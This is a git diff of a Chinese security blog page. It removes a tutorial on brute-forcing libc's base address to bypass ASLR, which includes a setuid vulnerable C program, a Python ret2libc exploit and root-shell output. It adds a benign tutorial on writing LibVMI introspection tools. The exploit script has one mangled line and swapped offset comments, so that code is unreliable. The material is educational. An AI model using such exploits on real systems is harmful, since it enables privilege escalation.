@@ -106,78 +106,6 @@
         
           <section id="main">
   
-    <article id="post-bypassaslr-bruteforce"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170102/bypassaslr-bruteforce/">绕过ASLR-第二篇章(暴力破解)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170102/bypassaslr-bruteforce/" class="article-date">
-	  <time datetime="2017-01-02T10:57:33.000Z" itemprop="datePublished">一月 2, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/bypassaslr-bruteforce" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第二篇章(暴力破解)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0X01 什么是暴力破解</li>
-<li>0X02 </li>
-<li>0X03</li>
-</ul>
-</blockquote>
-<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
-<p>在这篇文章中，我们来看看如果利用暴力破解技术来绕过共享库的地址随机化。</p>
-<h3 id="什么是暴力破解"><a href="#什么是暴力破解" class="headerlink" title="什么是暴力破解"></a>什么是暴力破解</h3><p>通过此技术，攻击者选择一个特定的libc基地址，然后不断尝试攻击程序，直到成功。如果你幸运的话，这是绕过ASLR最简单的技术。</p>
-<p><u>漏洞代码</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><u>编译命令</u>：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p>现在让我们来看看攻击者是如何暴力破解libc基地址的。下面是当开启随机化时，libc不同的基地址：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb75b6000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7568000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7595000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb75d9000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7542000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb756a000</span>)</div><div class="line">$</div></pre></td></tr></table></figure>
-<p>从上面可知，libc的随机化只局限在8个比特位中。因此，最多只要尝试256次，就可以获取root shell。下面的漏洞利用代码中，选择0xb7595000作为libc的基地址，然后我们再不断尝试</p>
-<p><u>漏洞利用代码</u>：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">libc_base_addr = <span class="number">0xb7595000</span></div><div class="line">exit_off = <span class="number">0x00032be0</span>             #Obtained from <span class="string">"readelf -s libc.so.6 | grep system"</span> command.</div><div class="line">system_off = <span class="number">0x0003f060</span>           #Obtained from <span class="string">"readelf -s libc.so.6 | grep exit"</span> command.</div><div class="line">system_addr = libc_base_addr + system_off</div><div class="line">exit_addr = libc_base_addr + exit_off</div><div class="line">system_arg = <span class="number">0x804827d</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numystem + <span class="built_in">exit</span> + system_arg</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(system_addr)</div><div class="line">buf += conv(exit_addr)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">#Multiple tries until we get lucky</div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> (i &lt; <span class="number">256</span>):</div><div class="line"> print <span class="string">"Number of tries: %d"</span> %i</div><div class="line"> i += <span class="number">1</span></div><div class="line"> ret = call([<span class="string">"./vuln"</span>, buf])</div><div class="line"> <span class="keyword">if</span> (not ret):</div><div class="line">  <span class="keyword">break</span></div><div class="line"> <span class="keyword">else</span>:</div><div class="line">  print <span class="string">"Exploit failed"</span></div></pre></td></tr></table></figure></p>
-<p>执行上面的漏洞利用代码就可以获取root shell，如下所示</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">Number of tries: <span class="number">0</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line">Exploit failed</div><div class="line">...</div><div class="line">Number of tries: <span class="number">42</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line">Exploit failed</div><div class="line">Number of tries: <span class="number">43</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
-<p><u>注意</u>： 类似地，栈地址和堆地址也可以暴力破解！</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/bypassaslr-bruteforce" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第二篇章(暴力破解)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
     <article id="post-rootkittutorial"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -683,11 +611,84 @@ make &amp;&amp; make install
 <!-- Table of Contents -->
 
   
+    <article id="post-libvmiintrospection"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170102/libvmiintrospection/">Write Introspection Tools Using Libvmi</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170102/libvmiintrospection/" class="article-date">
+	  <time datetime="2017-01-02T03:01:20.000Z" itemprop="datePublished">一月 2, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://ytliu.info/blog/2013/08/14/write-introspection-tools-using-libvmi/" target="_blank" rel="external">ytliu</a><br>编辑：@Tula</p>
+<hr>
+<p><strong>CSysSec注</strong>： Libvmi是个虚拟机监控API，本文介绍如何利用Libvmi写自己的监控工具。作者ytliu，来自上海交通大学PhD,研究方向是虚拟化与系统安全，在顶会CCS，HPCA等发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintrospection/" target="_blank" rel="external">Libvmi Setup</a>》</p>
+<hr>
+<p>Last week I’ve discussed about how to <a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">setup libvmi</a>, in this post I will show you how to write introspection tools using libvmi.</p>
+<p>The most typical example is <code>examples/process-list.c</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libvmi/libvmi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div></pre></td></tr></table></figure></p>
+<p>Firstly we need to include these header files, especially the <code>&lt;libvmi/libvmi.h&gt;</code>, it defines most of the variables and functions.</p>
+<p>Then we should initialize the vmi environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* initialize the libvmi library */</span></div><div class="line"><span class="keyword">if</span> (vmi_init(&amp;vmi, VMI_AUTO | VMI_INIT_COMPLETE, name) == VMI_FAILURE) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to init LibVMI library.\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>It will initialize the vmi (<code>vmi_instance_t</code>) struct with some platform information.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* init the offset values */</span></div><div class="line"><span class="keyword">if</span> (VMI_OS_LINUX == vmi_get_ostype(vmi)) &#123;</div><div class="line">    tasks_offset = vmi_get_offset(vmi, <span class="string">"linux_tasks"</span>);</div><div class="line">    name_offset = vmi_get_offset(vmi, <span class="string">"linux_name"</span>);</div><div class="line">    pid_offset = vmi_get_offset(vmi, <span class="string">"linux_pid"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>Then in this case, we should read some offset of tast_struct from the config file <code>/etc/libvmi.conf</code>. And if you want to add a config argument like <code>linux_files</code>, you can do as follows:</p>
+<p>Add an item in <code>libvmi/config/grammar.y</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">%token&lt;str&gt;  LINUX_FILES</div><div class="line">...</div><div class="line">assignment:</div><div class="line">  |</div><div class="line">...</div><div class="line">  linux_state_assignment</div><div class="line">  |</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>Then add an item in <code>libvmi/config/lexicon.l</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">linux_files  &#123; BeginToken(yytext); yylval.str = strndup(yytext, CONFIG_STR_LENGTH); <span class="keyword">return</span> LINUX_FILES;&#125;</div></pre></td></tr></table></figure></p>
+<p>Then add corresponding <code>strncmp</code> in <code>libvmi/os/linux/core.c</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">if</span> (stncmp(key, <span class="string">"linux_files"</span>, CONFIG_STR_LENGTH) == <span class="number">0</span>) &#123;</div><div class="line">  linux_instance-&gt;files_offset = *(<span class="keyword">int</span> *)value;</div><div class="line">  <span class="keyword">goto</span> _done;</div><div class="line">&#125;</div><div class="line">...</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strncmp</span>(offset_name, <span class="string">"linux_files"</span>, max_length) == <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">return</span> linux_instance-&gt;files_offset;</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>At last add the <code>files_offset</code> item to <code>struct linux_instance</code> in <code>libvmi/os/linux/linux.h</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> linux_instance &#123;</div><div class="line">  ...</div><div class="line">  <span class="keyword">uint64_t</span> files_offset;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="Then-compile-again-after-that-your-can-add-linux-files-to-your-config-file"><a href="#Then-compile-again-after-that-your-can-add-linux-files-to-your-config-file" class="headerlink" title="Then compile again, after that your can add linux_files to your config file."></a>Then compile again, after that your can add linux_files to your config file.</h3><p>Now, let’s continue to look at the vmi code:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* pause the vm for consistent memory access */</span></div><div class="line"><span class="keyword">if</span> (vmi_pause_vm(vmi) != VMI_SUCCESS) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to pause VM\n"</span>);</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">&#125; <span class="comment">// if</span></div></pre></td></tr></table></figure></p>
+<p>Before we do the vmi, we need to pause the vm for consistent memory access, then we can read memory from guest memory:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* get the head of the list */</span></div><div class="line"><span class="keyword">if</span> (VMI_OS_LINUX == vmi_get_ostype(vmi)) &#123;</div><div class="line">    current_process = vmi_translate_ksym2v(vmi, <span class="string">"init_task"</span>);</div><div class="line">&#125;</div><div class="line">...</div><div class="line"><span class="comment">/* walk the task list */</span></div><div class="line">list_head = current_process + tasks_offset;</div><div class="line">current_list_entry = list_head;</div><div class="line"></div><div class="line">status = vmi_read_addr_va(vmi, current_list_entry, <span class="number">0</span>, &amp;next_list_entry);</div><div class="line"><span class="keyword">if</span> (status == VMI_FAILURE) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to read next pointer at 0x%lx before entering loop\n"</span>,</div><div class="line">            current_list_entry);</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>We firstly get the head of the task_struct list <code>current_process</code>, then use <code>vmi_read_addr_va</code> to read the memory in address <code>current_list_entry</code>, which is the address of <code>next_list_entry</code>.</p>
+<p>Here <code>vmi_read_addr_va</code> is similar with following <code>vmi_read_32_va</code>, <code>vmi_read_str_va</code> and so on. These lib functions take the virtual address (<code>vaddr</code>) as one of there parameters, they firstly walk the page table with cr3 and get physical address (<code>paddr</code>), then they use the libxenctrl to map a memory page of that paddr, which return back the virtual address (<code>memory</code>) seen by Dom0, with the <code>memory</code>, they can use <code>memcpy</code> to copy the corresponding size of memory to the <code>buf</code>.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">do</span> &#123;</div><div class="line">    vmi_read_32_va(vmi, current_process + pid_offset, <span class="number">0</span>, &amp;pid);</div><div class="line">    procname = vmi_read_str_va(vmi, current_process + name_offset, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> (procname) &#123;</div><div class="line">        <span class="built_in">free</span>(procname);</div><div class="line">        procname = <span class="literal">NULL</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    current_list_entry = next_list_entry;</div><div class="line">    current_process = current_list_entry - tasks_offset;</div><div class="line"></div><div class="line">    <span class="comment">/* follow the next pointer */</span></div><div class="line">    status = vmi_read_addr_va(vmi, current_list_entry, <span class="number">0</span>, &amp;next_list_entry);</div><div class="line">    <span class="keyword">if</span> (status == VMI_FAILURE) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to read next pointer in loop at %lx\n"</span>, current_list_entry);</div><div class="line">        <span class="keyword">goto</span> error_exit;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">while</span> (next_list_entry != list_head);</div></pre></td></tr></table></figure></p>
+<p>This is the main loop of process vmi: it uses <code>vmi_read_32_va</code> to read pid (<code>pid_offset</code>) of each process, use <code>vmi_read_str_va</code> to read name (<code>name_offset</code>) of each process, and at last use <code>vmi_read_addr_va</code> to read the next entry of tast_struct in the list.</p>
+<p>Finally we should never forget to resume the guest vm and destroy the vmi environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* resume the vm */</span></div><div class="line">vmi_resume_vm(vmi);</div><div class="line"></div><div class="line"><span class="comment">/* cleanup any memory associated with the LibVMI instance */</span></div><div class="line">vmi_destroy(vmi);</div></pre></td></tr></table></figure></p>
+<p>We can compile and run the vmi tool in the root directory of libvmi:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make</div><div class="line">$ sudo ./examples/process-<span class="built_in">list</span> vm_name</div></pre></td></tr></table></figure></p>
+<p>If you want to write your own vmi tools, you can imitate the <code>process-list</code> to write a new one (e.g. my_vmi_tool.c). After that, you need to modify the <code>examples/Makefile.am</code> file:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">bin_PROGRAMS = ... my_vmi_tool</div><div class="line">...</div><div class="line">my_vmi_tool_SOURCES = my_vmi_tool.c</div></pre></td></tr></table></figure></p>
+<p>Actually after we run <code>make</code> in the root directory of libvmi, the <code>Makefile</code> in <code>examples/</code>directory will generate a new executable file called <code>my_vmi_tool</code>, which is a script file to invoke the actual code in your <code>my_vmi_tool.c</code>.</p>
+<hr>
+<p>Last thing you should know is: currently vmi tool are all user mode application code. It does not support to write vmi tool as a kernel module. The environment you vmi code run is just the user space on the host OS.</p>
+<p>Whenever you have any problem with libvmi, you can create a post in their <a href="https://groups.google.com/forum/#!forum/vmitools" target="_blank" rel="external">googlegroup</a>. The guys there are really very friendly, I’ve post 2 topics there and both receive very good feedbacks.</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintrospection/" target="_blank" rel="external">Libvmi Setup</a>》</p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控<span class="article-category-count">6</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/9/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/11/">下一页</a>
+    <a class="extend prev" rel="prev" href="/page/9/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/11/">下一页</a>
   </nav>
 
 </section>
@@ -775,18 +776,6 @@ make &amp;&amp; make install
     </ul>
     <div class="widget">
       <ul>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170427/vitae/">写在最前</a></h6>
-          <!--  <span>四月 27, 2017</span> -->
-            </div>
-
-          </li>
         
           <li class="clearfix">
 
@@ -963,6 +952,18 @@ make &amp;&amp; make install
             
 
               <h6 style="margin: 0;"><a href="/20170307/introspection-papers/">虚拟机监控论文推荐</a></h6>
+          <!--  <span>三月 7, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170307/course-zhiqianglin2/">名人课堂-系统安全与二进制代码分析(上)</a></h6>
           <!--  <span>三月 7, 2017</span> -->
             </div>
 
